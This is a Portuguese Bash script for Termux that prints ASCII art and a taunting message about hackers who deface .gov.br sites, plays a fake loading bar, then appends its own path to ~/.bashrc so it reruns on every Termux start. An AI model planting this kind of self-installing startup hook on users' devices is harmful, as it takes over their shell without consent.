#!/bin/bash

# Caminho do script
SCRIPT_PATH="/data/data/com.termux/files/home/demon.sh"

# Função para configurar o Termux
setup_termux() {
    # Verificar se o comando foi adicionado ao .bashrc
    if ! grep -q "$SCRIPT_PATH" ~/.bashrc; then
        echo "Configurando Termux para executar o script automaticamente..."
        echo "$SCRIPT_PATH" >> ~/.bashrc
        echo "Configuração concluída. Termux será reiniciado."
    else
        echo "Termux já configurado para executar o script automaticamente."
    fi
}

# Função principal
main() {
    # Arte ASCII
    cat << "EOF"
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                              (_.)  _  )   /
                                 \`.___/ \`    /
                                  \`-----' /
                      <----.     __ / __   \\
                      <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\
EOF

    # Mensagem
    echo "ENTAO QUER DIZER QUE VOCES SAO OS OWNADORES DAS PADOCARIAS .GOV.BR VAO A MERDA, SO DA DEFACE USANDO CLOUD VAZADA! by: untw0"

    # Simulação de carregamento
    total_steps=20  # Número total de etapas de carregamento
    delay=0.5       # Tempo de espera entre cada etapa em segundos
    progress=0      # Valor inicial do progresso

    echo -n "["
    while [ $progress -le $total_steps ]; do
        sleep $delay
        progress=$((progress + 1))
        filled=$(printf "%0.s#" $(seq 1 $progress))
        empty=$(printf "%0.s " $(seq $progress $total_steps))
        echo -n "$filled$empty"
    done
    echo "]"
    echo "100%"

    # Configurar o Termux
    setup_termux

    # Reiniciar Termux
    echo "Reiniciando Termux..."
    sleep 1
    termux-reload-settings
}

# Executar a função principal
main
